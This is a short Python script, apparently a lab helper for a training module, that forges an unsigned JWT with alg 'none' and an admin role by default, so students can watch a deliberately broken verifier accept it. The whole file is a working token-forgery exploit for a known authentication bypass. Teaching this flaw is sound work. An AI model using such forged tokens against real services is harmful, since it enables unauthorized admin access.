#!/usr/bin/env python3
"""Training helper for the local Module 12 lab only.
Builds an unsigned JWT (alg=none) so students can observe a deliberately broken verifier.
"""
import argparse, base64, json

def b64url(obj):
    raw=json.dumps(obj, separators=(',',':')).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

def main():
    p=argparse.ArgumentParser()
    p.add_argument('--user', default='student')
    p.add_argument('--role', default='admin')
    a=p.parse_args()
    token=f"{b64url({'alg':'none','typ':'JWT'})}.{b64url({'sub':a.user,'role':a.role})}."
    print(token)
if __name__=='__main__': main()
